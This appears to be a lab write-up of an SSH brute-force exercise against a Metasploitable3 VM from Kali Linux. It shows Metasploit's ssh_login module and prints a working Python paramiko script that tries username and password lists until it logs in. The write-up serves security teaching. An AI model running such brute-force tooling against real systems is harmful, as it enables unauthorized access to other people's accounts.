# Phase 1 – Vulnerability Identification and Exploitation

In this phase, we set up the attacker and victim machines, scanned for open ports, and launched brute-force attacks to exploit SSH login using Metasploit and a custom Python script.  
The objective was to demonstrate how weak credentials can be discovered and used to gain unauthorized access.

---

## Step 1: Configure the Environment

We configured the virtual machines using VirtualBox:
- The **victim** machine is Metasploitable3.
- The **attacker** machine is Kali Linux.

Connectivity was verified between the two machines.

### 1. Metasploitable3 is running
![Victim Ping](Imagess/Victim_Ping.png "Pinging the victim machine from Kali to confirm connectivity")
---
### 2. Victim Machine Login

This confirms that the victim machine (Metasploitable3) was successfully accessed using the correct username and password.

![Victim Login](Imagess/Successful_login.png "Login to Metasploitable3 as vagrant")
---

### 3. Victim IP Configuration

We checked the IP address of the victim machine to confirm its network visibility and connection readiness.

![Victim IP](Imagess/Victim_ip.png "Checking the IP address of the victim machine (Metasploitable3)")
---


### 4. Attacker IP Check

A ping test was conducted from the Kali machine to ensure successful communication with the victim.

![Attacker Ping](Imagess/Attacker_ping.png "Getting attacker machine’s IP address")
---

## Step 2: Use Metasploit to Perform Brute-Force

We used Metasploit's `scanner/ssh/ssh_login` module to perform a brute-force attack.

### 5. Launching Metasploit Console

We launched the Metasploit Framework to initiate a brute-force SSH attack on the victim.

![Launch Metasploit](Imagess/Launch_msfconsole.png "Opening Metasploit console on Kali")
---

### 6. Searching for SSH Login Module

We searched for the appropriate module to perform SSH brute-force attacks.

![Search SSH Module](Imagess/Search_msf.png "Searching for SSH login scanner module")
---

### 7. Setting SSH Brute-force Parameters

We configured the attack parameters: target IP, username/password lists, and thread count.

![MSF Setting](Imagess/msf_setting.png "Setting RHOST, USER_FILE, PASS_FILE, and THREADS for SSH attack")
---

### 8. Successful SSH Login using Metasploit

The attack successfully logged into the victim machine using the credentials vagrant:vagrant.

![Success Login Metasploit](Imagess/msf_success_login.png "Metasploit successfully finds valid credentials")
---

### 9. Active Session Opened

This confirms the opening of an interactive SSH session on the victim machine.

![MSF Session](Imagess/msf_session.png "Metasploit session opened after successful brute-force")
---

## Step 3: Implement a Custom Script

A Python script using the paramiko library was written and executed to perform a brute-force attack. The script identified valid credentials.


### 10. Custom Python Script Brute-force

```python
import paramiko
import socket

target_ip = "192.168.150.3"
target_port = 22

with open("usernames.txt", "r") as ufile:
    usernames = [line.strip() for line in ufile.readlines()]

with open("passwords.txt", "r") as pfile:
    passwords = [line.strip() for line in pfile.readlines()]

def ssh_connect(username, password, ip, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"[+] Success! Username: {username} Password: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed login with {username}:{password}")
        return False
    except socket.error as e:
        print(f"[!] Connection error: {e}")
        return False
    finally:
        client.close()

for username in usernames:
    for password in passwords:
        if ssh_connect(username, password, target_ip, target_port):
            exit()
```
### 11. Successful SSH Login using Python Script

This shows that the custom Python script was able to successfully brute-force the SSH credentials.  
The script tested multiple username and password combinations, and eventually found the correct pair:  
Username: vagrant, Password: vagrant.

![Custom Script](Imagess/custom_script.png "Python script performing SSH brute-force attack and succeeding")
---
